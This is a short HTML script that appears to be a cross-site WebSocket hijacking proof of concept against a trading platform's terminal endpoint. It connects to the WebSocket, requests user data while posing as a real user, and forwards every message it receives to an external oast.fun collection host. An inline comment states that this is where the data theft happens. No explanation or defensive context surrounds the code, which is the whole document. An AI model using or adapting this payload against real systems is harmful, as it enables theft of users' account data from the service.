<script>
let ws = new WebSocket("wss://mt5-real01-web-svg.deriv.com/terminal");

ws.onopen = () => {
    console.log("Connected");
    
    // Send commands like a real user
    ws.send(JSON.stringify({
        action: "get_user_data"
    }));
};

ws.onmessage = (event) => {
    // THIS is where you steal data
    fetch("https://skxtwhknhxpxgepmccdu9s7shkelo6gre.oast.fun/log", {
        method: "POST",
        body: event.data
    });
};
</script>
